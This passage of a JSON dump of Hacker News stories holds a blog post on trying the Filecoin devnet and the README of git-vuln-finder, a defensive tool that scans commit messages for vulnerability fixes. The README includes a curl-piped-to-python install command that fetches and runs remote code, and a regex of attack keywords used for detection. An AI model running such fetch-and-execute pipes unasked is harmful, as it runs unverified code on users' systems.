          "Seems a little odd to devote so much of the article to evaluating the user interface when the current release is aimed at \"developers, researchers, and community members who want to help _make_ Filecoin\"[1]. Still, I can see the potential.<p>One thing I'm still not sure of is how Filecoin compares with Sia. Based on the articles I've read so far it seems very similar (except that Sia is older so its tooling/UI is obviously much more mature). Are there any fundamental differences I may be missing?<p>[1]: <a href=\"https://filecoin.io/blog/opening-filecoin-project-repos/\" rel=\"nofollow\">https://filecoin.io/blog/opening-filecoin-project-repos/</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://gergely.imreh.net/blog/2019/02/first-impressions-of-filecoin/",
        "comments.comment_id": [19192163, 19192642],
        "comments.comment_author": ["nicolashahn", "Ajedi32"],
        "comments.comment_descendants": [1, 1],
        "comments.comment_time": [
          "2019-02-18T17:11:13Z",
          "2019-02-18T17:59:55Z"
        ],
        "comments.comment_text": [
          "Oof. Manual price setting for the storer/miner, manual storer selection for the user... Pretty large barriers to mainstream adoption. I'd think that in order for that to happen, both of these would be totally automatic. Still needs a lot of work.",
          "Seems a little odd to devote so much of the article to evaluating the user interface when the current release is aimed at \"developers, researchers, and community members who want to help _make_ Filecoin\"[1]. Still, I can see the potential.<p>One thing I'm still not sure of is how Filecoin compares with Sia. Based on the articles I've read so far it seems very similar (except that Sia is older so its tooling/UI is obviously much more mature). Are there any fundamental differences I may be missing?<p>[1]: <a href=\"https://filecoin.io/blog/opening-filecoin-project-repos/\" rel=\"nofollow\">https://filecoin.io/blog/opening-filecoin-project-repos/</a>"
        ],
        "id": "7debe7da-ac4c-4b7a-8549-de8d4cdc841e",
        "url_text": "Im an interested user of many novel technologies, some examples being cryptocurrencies and IPFS. One technology that I was keeping an eye on was at the intersection of that two: Filecoin (its using blockchain and built on IPFS by the people who made IPFS). It aims to be a decentralized storage network, where nodes are rewarded by storing users data, in a programmatic and secure way. After a long wait, the Filecoin repositories just opened up a few days ago (see also the relevant Hacker News discussion). This allowed everyone to give the newly deployed development chain (devnet) a spin, and try out one possible future-of-storage. Since the release, Ive spent a decent handful of hours with Filecoin, and thus gathered a few first impressions. These are very early stages for the technology, so take all my comments with that nurturing point of view. Im glad they release stuff at their version 0.0.2 as it happened, even if a lot of things are in flux. Also, Ive spent a bunch of time with IPFS, a lot of parts of the experience with Filecoin (or rather with the initial implementation of go-filecoin is not as surprising (more familar) to me than likely to someone for the first time a project made by this team. More on this later. Now, in hopefully somewhat logical order... Getting started The first thing is obviously getting and installing the binaries for the project. The initial implementation is go-filecoin, which is not totally surprising, one of the two main IPFS implementations is also go-ipfs (the other, for the curious, is js-ipfs, but filecoin does not have a Javascript implementation just yet). As there are no binary releases for go-filecoin just yet, well need to install from source. The project relies on pretty recent Go (1.11.1 or 1.11.2, its not clear from the docs and the code), as well as pretty recent Rust (1.31.0, which is about 2 months old). If the combination of the two is surprising, its because some of the heavy lifting libraries was implemented in Rust, for performance reasons (that I think used in the proving that a node actually stores the data that it said it did, without sending the whole data for inspection aka, the secret sauce of Filecoin). On my ArchLinux machine, these (or newer) versions are already a default, so it was easy to get them, while on another Ubuntu 18.04 LTS that I used, youll have to do some manual installs if youd like new enough versions. Still, its doable. To facilitate installation on my system, Ive also made an ArchLinux package for go-filecoin-git. Its not super great quality, but keeping with the upstream projects release early approach its better than not having one One surprising aspect for a new user is that the initial compilation can take hours. Emphasis added, it makes a lot of things a lot more difficult. The source of this long time to compile is the parameter calculation in the rust libraries for the secret sauce, and fortunately the team noted that not everyone would expect the compilation to just run on full CPU for ~1.5 hours as it did on my laptop. Fortunately, if built locally, Rust is using caching, and on subsequent builds it can be a lot faster, but the first is a pain. Also, this makes environments where theres no caching available (such as building in Docker containers) a bit of a headache, and indeed good that there are precomputed parts available (so that clients can use those instead costly local computation, trading off for large network downloads) but those parts are not for the whole process, as much as I can tell, some is still time-consuming. Also memory consuming, as I run into my ArchLinux package not building in my CircleCI test environment, apparently by going above the allowed memory consumption and being killed (that was fun to debug, and I havent solved it yet) One note on the tools, is while the project is using Go, they are not using the regular go get methodology, but have their own gx package management tool which operates on IPFS. Talk about dogfooding! In the end, however, I had my binaries running, and could turn to their Getting Started Guide, and starting to sync some Filecoin blocks (both on ArchLinux and Ubuntu). Feels good. :) Early participation in the filecoin devnet Also get some FIL (the actual coin) from the faucet, and off to the races (Can request funds from the faucet once every 24 hours). Concepts The next step was giving a spin to the rest of the getting started, such as storing some files, and mining some coins. Here I did run into some conceptual difficulties, compared to other coins encountered previously which is quite expected, since this is a really functional tool, not just a value storage & transmission network. One of the first conceptual difficulty is that managing filecoin workflows seems to be quite a bit more manual compared to what Ive expected. What Ive expected (with no particular basis for this expectation, to be fair), is that as a miner I set up a node with spare storage space, and I see the coins coming inas a person who has files to store, I just say store these files, and be done with it if I have enough funds How it really works: as a miner, unless I put in a price for my storage, nothing will happen. That price is valid for a certain amount of time (a number of blocks), and I can put in another price alongside, but dont seem to be able to revoke a price. Yeah, I can see how this could be done automatically in the future, but still have some awkward aspects, more on this lateras a storage user, I have to specifically choose a miner to store my data. This is one feels a lot more difficult to handle, as it has proven a pain to find where can I store stuff, and have to manage the lifecycle of that storage (e.g. have to store the message ID where the miner agreed to the deal, otherwise I dont seem to be able to look up later, and thus dont seem to be able to check the feedback whether the miner is done storing the stuff they said they will) This (current) manual management really puts the network to the toy level, in my opinion. But thats not necessarily a problem, its the devnet currently anyways, and will have to have better tools later anyways. Another part of the concept that is difficult at first, that there are the filecoinnodes/daemon that one runs, which have wallet addresses, while a miners are running inside those nodes, have similar-looking addresses than the nodes wallets, but the appear to be able to point at other nodes as beneficiary. That so far makes sense (a master node which collects the payments for the workers, and a bunch of workers that provide the storage for master). My sloght confusion is in part that there are multiple formats of addresses (the wallet and peers formats), and at different stages have to address the miner, and sometimes the node it runs inside in (so theres a lot of conversion between addresses and IDs of different kinds), and also its not clear if that concept is really such (master + multiple workers), as I havent managed to set one thing up like that just yet (due to some things taking a lot of time, and spent more time on testing the straightforward stuff). When setting up a miner, one also has to provide a collateral for the storage. I would guess that would be the price one loses if the storage goes unavailable during a contract? But its not totally clear yet (will have to dig more into the docs). Whats difficult from this is that how would one in normal circumstances have enough coins to bootstrap (provide collateral and be able to start to mine)? On the devnet the faucet solves this, but in real use later I wonder what will be the flow? Also might be somewhat of a surprise, that it seems nodes get rewards on mining based on not the storage they have, but the amount of data they stored on behalf of clients. Combine this with the manual seeking out of miners by clients, and it currently all relies luck, whether or not someones miner was found and was utilized. Otherwise it will be just treading water. I guess this will be better with an automatic market as well, in the meantime might just set up 2 nodes that pat each other in the back store files on each other to see the effect first hand. Usability The usability issues Ive run into (that are the majority of the issues, I think) are not surprising given how early stage everything is, but still a bit of rundown might help others to avoid (or be less surprised at least) later. Given that the whole Filecoin chain is less than 3 days old now, it already takes hours to download the whole chain starting from scratch (depends on the network, but still getting about 30-60x the download speed compared to block generation speed, which is very small multiplier). I think this will get old very quickly. The current latest block, 8282, as I write this When I stopped my machine overnight, and started up the next day, it also took quite a long time till it started downloading blocks again. Seems like the daemon works the best when it is kept on for a long time and can build up a lot of p2p connections, but thats just a hunch. Then when storing and retrieving data, its a bit inconvenient how much information the I have to keep track of: the miners acceptance message to be able to check the storage status; then the miners address and the piece of datas content ID itself so I know exactly from where to retrieve it back (where have I put my data?). I guess this is again automated for later, but strange that it doesnt seem to be stored somewhere (maybe Ive missed it). The retrieval times can be quite long as well. I generally get 3-6 minutes retrieval times, which is 6-12 blocks worth of time and given that one pays buy the number of blocks the data is stored for As described above, the miners have to set their price for a given time, and storage clients contract them for a specific piece of content for a number of blocks. It feels like that as a miner one wants to set short times so can adjust the price as needed. On the other hand, storage clients can then only contract for short time, and need to continuously recontract the data. First I thought this might be super annoying, as then probably would spend a lot of time uploading data, but I think the underlying storage is IPFS, so the recontracting might actually be really cheap (as the network already stores more copies of the file at that time). Looks like the current block size of the storage is 256MB, meaning that files stored take up multiples of 256MB as stored. If I contract 2 small files to a miner, it would still use up 2x256MB at least. Some experiments Ive done certainly seem to show that, but not sure about that mechanism. Also, the nightly network seems to be using much smaller blocks, but not sure its because its the future, or because the nightly network requires that for development? Given these relative complexity of storing files and the block size effects above, it seems like Filecoin so far is aiming at medium / large files, not small ones, so for example storing a source code repo might not be nice currently. On the other hand, this feels temporary, the contents the nodes store seem to be same kinds of content IDs as IPFS uses (not surprisingly), and IPFS can slurp up directories, to be referred by a single content ID (and all files in there referenced within). I would not be surprised that sooner rather than later, one would be able use a similar import for batches of files. The data stored on the network is also just the content, and none of the metadata. Thus I need to keep track of extra info (this Content ID is an MP3 with this title, &c). This will likely require extra layer of tooling on top, though the current behaviour is just what comes from IPFS, I believe, which has some file type guessing in the interfaces but also at least have filenames if directories are stored, as mentioned above. I also has to import files into the local Filecoin client, before it can be contracted out. Thus the amount of space available on my computer determines quite a bit how much data can be stored on the network as well: everything is using at least 2x its own space (once in the filesystem, and once imported in the Filecoin node). Lot of the other usability issues also come from the command line interface (CLI) of go-filecoin, which is not yet very polished (again, not a surprise). For example most commands output formatted text, and have to add the enc=json setting to have a JSON output. Except a few commands output JSON by default Then the formatted text and the JSON output is not exactly the same fields, the two have different entries For many practical tasks, one also has to chain a bunch of the commands to get from A to B, and thus I think users of go-filecoin currently will have to be pretty good shell scripters (similarly to the go-ipfs users). As an example, to check whether a miner is reachable (so whether I should even try to contract it for storage: # Use this to get all the miner storage price offer go-filecoin client list-asks --enc=json # Pick a MINER that you like above PEER=$(go-filecoin address lookup $MINER) # Check if the peer has a path to it from us, and try to ping go-filecoin swarm findpeer $PEER && go-filecoin ping -n 1 $PEER && echo \"Contacted!\" Or scaling this up, finding all viable miners that one could connect to (though would still need price info in a practical setting): #!/bin/bash function checkminer() { local MINER=$1 local ADDR=$(go-filecoin address lookup $MINER) go-filecoin swarm findpeer $ADDR &> /dev/null && \\ go-filecoin ping -n 1 $ADDR &> /dev/null && \\ echo \"Possible viable peer: $MINER $ADDR\" } export -f checkminer go-filecoin client list-asks --enc=json | jq -r .Miner | sort | uniq | xargs -I{} -P 15 bash -c 'checkminer {}' Or just see the (very helpful) examples in the getting started guides linked above. Im not sure that these above are convincing, but start to use Filecoin, and youll find saving information into shell variables, and running scripts in no time There are also some unexplained workflows (as far as I can tell currectly), such as whether its possible to send coins from one wallet to the other directly? And if it is possible, how? I think the faucet does it, so maybe thats the code to look at, not sure if its anything special to the faucet, or just using the API. There is also the concept of payment channels (go-filecoin paych, the commands within), which are set up to handle periodic payments to miners based on their proof of storage (Proof of spacetime? Proof of replication? One of the many proofs Ive seen mentioned in the docs, sorry if not precise enough). Those are funky, as there might be a lot of coins tied up there with failed storage contracts (as for example I was trying to contract my own node to store something, and that didnt work, as it didnt find a path to itself but still put aside / tied up the coins in a channel :). I wonder how would one release coins from there? Or how to get back the collateral from the miners if one wants to decommission one? Development experience The go-filecoin repository seems to be pretty well setup, the issue templates work well, the repo seems to be pretty active, there are many ongoing issues and PRs. Seems like a lot of people are filing issues (early adopters tend to) which is great to see, and the developers replying & following up there is very promising. Some of the tooling is a bit behind, though, such as some version number issues, some deployment might be more difficult because of the gx tool used (that should require new code release to IPFS to be able to referred to as each release there is immutable, at least I guess its how it works), which makes some cycles longer. I was also checking out the Community section and used the chat on Riot.im/Matrix. That was a hit and miss had my issues with Riot (which I wouldnt go into now), but at least there were some good exchanges and quick help (and given some back too), I guess it should be all much busier during the week. Into the future If the concept of Filecoin is interesting to you, would suggest to check it out, dig into the whitepaper (which I need to review again too), go store some data, look around the network stats, watch some Filecoin related talks for background, and file some issues if you run into any problem I wonder when the mainnet release of Filecoin would be, but from the above I hope not too soon. There are plenty of things to fix, while if you dig deep enough, youll see that this project is trying to solve some really hairy problems, which is much easier to appreciate after trying out this teams proposed solutions to them. The future of distributed storage is interesting, regardless of how big extent Filecoin solves things. ",
        "_version_": 1718527386640711680
      },
      {
        "story_id": [21434222],
        "story_author": ["adulau"],
        "story_descendants": [4],
        "story_score": [46],
        "story_time": ["2019-11-03T15:03:47Z"],
        "story_title": "Finding potential software vulnerabilities from Git commit messages",
        "search": [
          "Finding potential software vulnerabilities from Git commit messages",
          "https://github.com/cve-search/git-vuln-finder",
          "git-vuln-finder Finding potential software vulnerabilities from git commit messages. The output format is a JSON with the associated commit which could contain a fix regarding a software vulnerability. The search is based on a set of regular expressions against the commit messages only. If CVE IDs are present, those are added automatically in the output. Requirements jq (sudo apt install jq) Installation Use it as a library git-vuln-finder can be install with poetry. If you don't have poetry installed, you can do the following curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python. $ poetry install $ poetry shell $ git-vuln-finder -h You can also use pip. Then just import it: Python 3.8.0 (default, Dec 11 2019, 21:43:13) [GCC 9.2.1 20191008] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> from git_vuln_finder import find >>> all_potential_vulnerabilities, all_cve_found, found = find(\"~/git/curl\") >>> [commit for commit, summary in all_potential_vulnerabilities.items() if summary['state'] == 'cve-assigned'] ['9069838b30fb3b48af0123e39f664cea683254a5', 'facb0e4662415b5f28163e853dc6742ac5fafb3d', ... snap ... '8a75dbeb2305297640453029b7905ef51b87e8dd', '1dc43de0dccc2ea7da6dddb7b98f8d7dcf323914', '192c4f788d48f82c03e9cef40013f34370e90737', '2eb8dcf26cb37f09cffe26909a646e702dbcab66', 'fa1ae0abcde5df8d0b3283299e3f246bedf7692c', 'c11c30a8c8d727dcf5634fa0cc6ee0b4b77ddc3d', '75ca568fa1c19de4c5358fed246686de8467c238', 'a20daf90e358c1476a325ea665d533f7a27e3364', '042cc1f69ec0878f542667cb684378869f859911'] >>> print(json.dumps(all_potential_vulnerabilities['9069838b30fb3b48af0123e39f664cea683254a5'], sort_keys=True, indent=4, separators=(\",\", \": \"))) { \"author\": \"Daniel Stenberg\", \"author-email\": \"daniel@haxx.se\", \"authored_date\": 1567544372, \"branches\": [ \"master\" ], \"commit-id\": \"9069838b30fb3b48af0123e39f664cea683254a5\", \"committed_date\": 1568009674, \"cve\": [ \"CVE-2019-5481\", \"CVE-2019-5481\" ], \"language\": \"en\", \"message\": \"security:read_data fix bad realloc()\\n\\n... that could end up a double-free\\n\\nCVE-2019-5481\\nBug: https://curl.haxx.se/docs/CVE-2019-5481.html\\n\", \"origin\": \"https://github.com/curl/curl.git\", \"origin-github-api\": \"https://api.github.com/repos///github.com/curl/curl/commits/9069838b30fb3b48af0123e39f664cea683254a5\", \"pattern-matches\": [ \"double-free\" ], \"pattern-selected\": \"(?i)(double[-| ]free|buffer overflow|double free|race[-| ]condition)\", \"state\": \"cve-assigned\", \"stats\": { \"deletions\": 4, \"files\": 1, \"insertions\": 2, \"lines\": 6 }, \"summary\": \"security:read_data fix bad realloc()\", \"tags\": [] } Use it as a command line tool $ pipx install git-vuln-finder $ git-vuln-finder --help You can also use pip. pipx installs scripts (system wide available) provided by Python packages into separate virtualenvs to shield them from your system and each other. Usage usage: git-vuln-finder [-h] [-v] [-r R] [-o O] [-s S] [-p P] [-c] [-t] Finding potential software vulnerabilities from git commit messages. optional arguments: -h, --help show this help message and exit -v increase output verbosity -r R git repository to analyse -o O Output format: [json] -s S State of the commit found -p P Matching pattern to use: [vulnpatterns, cryptopatterns, cpatterns] - the pattern 'all' is used to match all the patterns at once. -c output only a list of the CVE pattern found in commit messages (disable by default) -t Include tags matching a specific commit More info: https://github.com/cve-search/git-vuln-finder Patterns git-vuln-finder comes with 3 default patterns which can be selected to find the potential vulnerabilities described in the commit messages such as: vulnpatterns is a generic vulnerability pattern especially targeting web application and generic security commit message. Based on an academic paper. cryptopatterns is a vulnerability pattern for cryptographic errors mentioned in commit messages. cpatterns is a set of standard vulnerability patterns see for C/C++-like languages. A sample partial output from Curl git repository $ git-vuln-finder -r ~/git/curl | jq . ... \"6df916d751e72fc9a1febc07bb59c4ddd886c043\": { \"message\": \"loadlibrary: Only load system DLLs from the system directory\\n\\nInspiration provided by: Daniel Stenberg and Ray Satiro\\n\\nBug: https://curl.haxx.se/docs/adv_20160530.html\\n\\nRef: Windows DLL hijacking with curl, CVE-2016-4802\\n\", \"language\": \"en\", \"commit-id\": \"6df916d751e72fc9a1febc07bb59c4ddd886c043\", \"summary\": \"loadlibrary: Only load system DLLs from the system directory\", \"stats\": { \"insertions\": 180, \"deletions\": 8, \"lines\": 188, \"files\": 7 }, \"author\": \"Steve Holme\", \"author-email\": \"steve_holme@hotmail.com\", \"authored_date\": 1464555460, \"committed_date\": 1464588867, \"branches\": [ \"master\" ], \"pattern-selected\": \"(?i)(denial of service |\\bXXE\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|xframeoptions|attack|cross site |exploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcrossorigin\\b|unauthori[z|s]ed |infinite loop)\", \"pattern-matches\": [ \"hijack\" ], \"origin\": \"git@github.com:curl/curl.git\", \"origin-github-api\": \"https://api.github.com/repos/curl/curl/commits/6df916d751e72fc9a1febc07bb59c4ddd886c043\", \"tags\": [], \"cve\": [ \"CVE-2016-4802\" ], \"state\": \"cve-assigned\" }, \"c2b3f264cb5210f82bdc84a3b89250a611b68dd3\": { \"message\": \"CONNECT_ONLY: don't close connection on GSS 401/407 reponses\\n\\nPreviously, connections were closed immediately before the user had a\\nchance to extract the socket when the proxy required Negotiate\\nauthentication.\\n\\nThis regression was brought in with the security fix in commit\\n79b9d5f1a42578f\\n\\nCloses #655\\n\", \"language\": \"en\", \"commit-id\": \"c2b3f264cb5210f82bdc84a3b89250a611b68dd3\", \"summary\": \"CONNECT_ONLY: don't close connection on GSS 401/407 reponses\", \"stats\": { \"insertions\": 4, \"deletions\": 2, \"lines\": 6, \"files\": 1 }, \"author\": \"Marcel Raad\", \"author-email\": \"raad@teamviewer.com\", \"authored_date\": 1455523116, \"committed_date\": 1461704516, \"branches\": [ \"master\" ], \"pattern-selected\": \"(?i)(denial of service |\\bXXE\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|xframeoptions|attack|cross site |exploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcrossorigin\\b|unauthori[z|s]ed |infinite loop)\", \"pattern-matches\": [ \"security \" ], \"origin\": \"git@github.com:curl/curl.git\", \"origin-github-api\": \"https://api.github.com/repos/curl/curl/commits/c2b3f264cb5210f82bdc84a3b89250a611b68dd3\", \"tags\": [], \"state\": \"under-review\" }, ... Extracting CVE id(s) from git messages \"98d132cf6a879faf0147aa83ea0c07ff326260ed\": { \"message\": \"Add a macro for testing assertion in both debug and production builds\\n\\nIf we have an assert then in a debug build we want an abort() to occur.\\nIn a production build we wan t the function to return an error.\\n\\nThis introduces a new macro to assist with that. The idea is to replace\\nexisting use of OPENSSL_assert() with this new macro. The problem with\\nOPENSSL _assert() is that it aborts() on an assertion failure in both debug\\nand production builds. It should never be a library's decision to abort a\\nprocess (we don't get to decide when to kill t he life support machine or\\nthe nuclear reactor control system). Additionally if an attacker can\\ncause a reachable assert to be hit then this can be a source of DoS attacks\\ne.g. see CVE-20 17-3733, CVE-2015-0293, CVE-2011-4577 and CVE-2002-1568.\\n\\nReviewed-by: Tim Hudson <tjh@openssl.org>\\n(Merged from https://github.com/openssl/openssl/pull/3496)\", \"commit-id\": \"98d132cf6a879faf0147aa83ea0c07ff326260ed\", \"summary\": \"Add a macro for testing assertion in both debug and production builds\", \"stats\": { \"insertions\": 18, \"deletions\": 0, \"lines\": 18, \"files\": 1 }, \"author\": \"Matt Caswell\", \"author-email\": \"matt@openssl.org\", \"authored_date\": 1495182637, \"committed_date\": 1495457671, \"branches\": [ \"master\" ], \"pattern-selected\": \"(?i)(denial of service |\\bXXE\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|xframeoptions|attack|cross site |ex ploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcrossorigin\\b|unauthori[z|s]ed |infinite loop)\", \"pattern-matches\": [ \"attack\" ], \"cve\": [ \"CVE-2017-3733\", \"CVE-2015-0293\", \"CVE-2011-4577\", \"CVE-2002-1568\" ], \"state\": \"cve-assigned\" } Running the tests License and author(s) This software is free software and licensed under the AGPL version 3. Copyright (c) 2019-2020 Alexandre Dulaunoy - https://github.com/adulau/ Acknowledgment Thanks to Jean-Louis Huynen for the discussions about the crypto vulnerability patterns. Thanks to Sebastien Tricaud for the discussions regarding native language, commit messages and external patterns. Thanks to Cedric Bonhomme to make git-vuln-finder a Python library, add tests and improve the overall installation process. Contributing We welcome contributions for the software and especially additional vulnerability patterns. Every contributors will be added in the AUTHORS file and collectively own this open source software. The contributors acknowledge the Developer Certificate of Origin. References Notes https://csce.ucmss.com/cr/books/2017/LFS/CSREA2017/ICA2077.pdf (mainly using CVE referenced in the commit message) - archive (http://archive.is/xep9o) https://asankhaya.github.io/pdf/automated-identification-of-security-issues-from-commit-messages-and-bug-reports.pdf (2 main regexps) ",
          "In case anyone else was curious, the regular expression used is:<p>vulnpatterns = re.compile(\"(?i)(denial of service |\\bXX E\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|x−frame−options|attack|cross site |exploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcross−origin\\b|unauthori[z|s]ed |infinite loop)\")",
          "This reminds me of a paper from google, where they try to determine how risky a change to a file is, according to its commit history. Given you use semantic commit messages, you can just look on the number of fix() commits and infer a risk level.\nLater, depending on the calculated risk, you may run a different set of tests."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/cve-search/git-vuln-finder",
        "comments.comment_id": [21437659, 21439234],
        "comments.comment_author": ["nograpes", "pedro1976"],
        "comments.comment_descendants": [1, 0],
        "comments.comment_time": [
          "2019-11-03T23:55:44Z",
          "2019-11-04T05:22:36Z"
        ],
        "comments.comment_text": [
          "In case anyone else was curious, the regular expression used is:<p>vulnpatterns = re.compile(\"(?i)(denial of service |\\bXX E\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|x−frame−options|attack|cross site |exploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcross−origin\\b|unauthori[z|s]ed |infinite loop)\")",
          "This reminds me of a paper from google, where they try to determine how risky a change to a file is, according to its commit history. Given you use semantic commit messages, you can just look on the number of fix() commits and infer a risk level.\nLater, depending on the calculated risk, you may run a different set of tests."
        ],
        "id": "4d8a1d14-63b5-4c3a-bd9b-1588daf3e73b",
        "url_text": "git-vuln-finder Finding potential software vulnerabilities from git commit messages. The output format is a JSON with the associated commit which could contain a fix regarding a software vulnerability. The search is based on a set of regular expressions against the commit messages only. If CVE IDs are present, those are added automatically in the output. Requirements jq (sudo apt install jq) Installation Use it as a library git-vuln-finder can be install with poetry. If you don't have poetry installed, you can do the following curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python. $ poetry install $ poetry shell $ git-vuln-finder -h You can also use pip. Then just import it: Python 3.8.0 (default, Dec 11 2019, 21:43:13) [GCC 9.2.1 20191008] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> from git_vuln_finder import find >>> all_potential_vulnerabilities, all_cve_found, found = find(\"~/git/curl\") >>> [commit for commit, summary in all_potential_vulnerabilities.items() if summary['state'] == 'cve-assigned'] ['9069838b30fb3b48af0123e39f664cea683254a5', 'facb0e4662415b5f28163e853dc6742ac5fafb3d', ... snap ... '8a75dbeb2305297640453029b7905ef51b87e8dd', '1dc43de0dccc2ea7da6dddb7b98f8d7dcf323914', '192c4f788d48f82c03e9cef40013f34370e90737', '2eb8dcf26cb37f09cffe26909a646e702dbcab66', 'fa1ae0abcde5df8d0b3283299e3f246bedf7692c', 'c11c30a8c8d727dcf5634fa0cc6ee0b4b77ddc3d', '75ca568fa1c19de4c5358fed246686de8467c238', 'a20daf90e358c1476a325ea665d533f7a27e3364', '042cc1f69ec0878f542667cb684378869f859911'] >>> print(json.dumps(all_potential_vulnerabilities['9069838b30fb3b48af0123e39f664cea683254a5'], sort_keys=True, indent=4, separators=(\",\", \": \"))) { \"author\": \"Daniel Stenberg\", \"author-email\": \"daniel@haxx.se\", \"authored_date\": 1567544372, \"branches\": [ \"master\" ], \"commit-id\": \"9069838b30fb3b48af0123e39f664cea683254a5\", \"committed_date\": 1568009674, \"cve\": [ \"CVE-2019-5481\", \"CVE-2019-5481\" ], \"language\": \"en\", \"message\": \"security:read_data fix bad realloc()\\n\\n... that could end up a double-free\\n\\nCVE-2019-5481\\nBug: https://curl.haxx.se/docs/CVE-2019-5481.html\\n\", \"origin\": \"https://github.com/curl/curl.git\", \"origin-github-api\": \"https://api.github.com/repos///github.com/curl/curl/commits/9069838b30fb3b48af0123e39f664cea683254a5\", \"pattern-matches\": [ \"double-free\" ], \"pattern-selected\": \"(?i)(double[-| ]free|buffer overflow|double free|race[-| ]condition)\", \"state\": \"cve-assigned\", \"stats\": { \"deletions\": 4, \"files\": 1, \"insertions\": 2, \"lines\": 6 }, \"summary\": \"security:read_data fix bad realloc()\", \"tags\": [] } Use it as a command line tool $ pipx install git-vuln-finder $ git-vuln-finder --help You can also use pip. pipx installs scripts (system wide available) provided by Python packages into separate virtualenvs to shield them from your system and each other. Usage usage: git-vuln-finder [-h] [-v] [-r R] [-o O] [-s S] [-p P] [-c] [-t] Finding potential software vulnerabilities from git commit messages. optional arguments: -h, --help show this help message and exit -v increase output verbosity -r R git repository to analyse -o O Output format: [json] -s S State of the commit found -p P Matching pattern to use: [vulnpatterns, cryptopatterns, cpatterns] - the pattern 'all' is used to match all the patterns at once. -c output only a list of the CVE pattern found in commit messages (disable by default) -t Include tags matching a specific commit More info: https://github.com/cve-search/git-vuln-finder Patterns git-vuln-finder comes with 3 default patterns which can be selected to find the potential vulnerabilities described in the commit messages such as: vulnpatterns is a generic vulnerability pattern especially targeting web application and generic security commit message. Based on an academic paper. cryptopatterns is a vulnerability pattern for cryptographic errors mentioned in commit messages. cpatterns is a set of standard vulnerability patterns see for C/C++-like languages. A sample partial output from Curl git repository $ git-vuln-finder -r ~/git/curl | jq . ... \"6df916d751e72fc9a1febc07bb59c4ddd886c043\": { \"message\": \"loadlibrary: Only load system DLLs from the system directory\\n\\nInspiration provided by: Daniel Stenberg and Ray Satiro\\n\\nBug: https://curl.haxx.se/docs/adv_20160530.html\\n\\nRef: Windows DLL hijacking with curl, CVE-2016-4802\\n\", \"language\": \"en\", \"commit-id\": \"6df916d751e72fc9a1febc07bb59c4ddd886c043\", \"summary\": \"loadlibrary: Only load system DLLs from the system directory\", \"stats\": { \"insertions\": 180, \"deletions\": 8, \"lines\": 188, \"files\": 7 }, \"author\": \"Steve Holme\", \"author-email\": \"steve_holme@hotmail.com\", \"authored_date\": 1464555460, \"committed_date\": 1464588867, \"branches\": [ \"master\" ], \"pattern-selected\": \"(?i)(denial of service |\\bXXE\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|xframeoptions|attack|cross site |exploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcrossorigin\\b|unauthori[z|s]ed |infinite loop)\", \"pattern-matches\": [ \"hijack\" ], \"origin\": \"git@github.com:curl/curl.git\", \"origin-github-api\": \"https://api.github.com/repos/curl/curl/commits/6df916d751e72fc9a1febc07bb59c4ddd886c043\", \"tags\": [], \"cve\": [ \"CVE-2016-4802\" ], \"state\": \"cve-assigned\" }, \"c2b3f264cb5210f82bdc84a3b89250a611b68dd3\": { \"message\": \"CONNECT_ONLY: don't close connection on GSS 401/407 reponses\\n\\nPreviously, connections were closed immediately before the user had a\\nchance to extract the socket when the proxy required Negotiate\\nauthentication.\\n\\nThis regression was brought in with the security fix in commit\\n79b9d5f1a42578f\\n\\nCloses #655\\n\", \"language\": \"en\", \"commit-id\": \"c2b3f264cb5210f82bdc84a3b89250a611b68dd3\", \"summary\": \"CONNECT_ONLY: don't close connection on GSS 401/407 reponses\", \"stats\": { \"insertions\": 4, \"deletions\": 2, \"lines\": 6, \"files\": 1 }, \"author\": \"Marcel Raad\", \"author-email\": \"raad@teamviewer.com\", \"authored_date\": 1455523116, \"committed_date\": 1461704516, \"branches\": [ \"master\" ], \"pattern-selected\": \"(?i)(denial of service |\\bXXE\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|xframeoptions|attack|cross site |exploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcrossorigin\\b|unauthori[z|s]ed |infinite loop)\", \"pattern-matches\": [ \"security \" ], \"origin\": \"git@github.com:curl/curl.git\", \"origin-github-api\": 